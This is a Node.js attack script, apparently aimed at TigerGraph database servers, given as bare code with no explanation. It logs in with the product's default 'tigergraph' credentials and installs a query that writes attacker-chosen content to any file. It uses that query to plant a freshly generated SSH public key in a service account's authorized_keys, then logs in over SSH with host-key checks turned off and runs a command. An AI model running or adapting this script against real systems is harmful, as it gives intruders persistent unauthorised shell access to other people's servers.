import { readFileSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
const target = process.argv[2];
const query = `CREATE QUERY export_value(FILE destination, STRING payload) { PRINT payload TO_CSV destination; } INSTALL QUERY export_value`;
await fetch(`http://${target}:14240/api/gsql-server/gsql/v1/statements`, {
  method: 'POST', headers: {Authorization: 'Basic ' + Buffer.from('tigergraph:tigergraph').toString('base64')}, body: query
});
execFileSync('ssh-keygen', ['-t', 'ed25519', '-N', '', '-f', '/tmp/query_access']);
const key = readFileSync('/tmp/query_access.pub', 'utf8').trim();
const destination = '/home/service/.ssh/authorized_keys';
await fetch(`http://${target}:9000/query/default/export_value?f=${encodeURIComponent(destination)}&c=${encodeURIComponent(key)}`);
execFileSync('ssh', ['-i', '/tmp/query_access', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', `service@${target}`, 'id']);
